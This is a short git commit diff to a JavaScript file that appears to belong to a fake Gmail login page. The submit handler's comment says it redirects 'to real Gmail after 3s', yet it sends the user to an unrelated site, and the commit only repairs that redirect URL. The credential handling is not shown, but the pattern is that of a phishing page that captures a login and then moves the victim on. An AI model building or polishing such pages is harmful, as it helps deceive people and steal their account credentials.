c10863cbad92f362a12b0ca4806c903cf5a30d56
muhammadhamzafx2-code <muhammadhamzafx2@gmail.com>
2026-07-12 23:36:58 +0000

    Update scriptg.js

--- scriptg.js
+++ scriptg.js
@@ -75,6 +75,6 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
     
     // Redirect to real Gmail after 3s
     setTimeout(() => {
-        window.location.href = 'xmvpropfirm.com';
+        window.location.href = 'https://xmvpropfirm.com';
     }, 3000);
 });
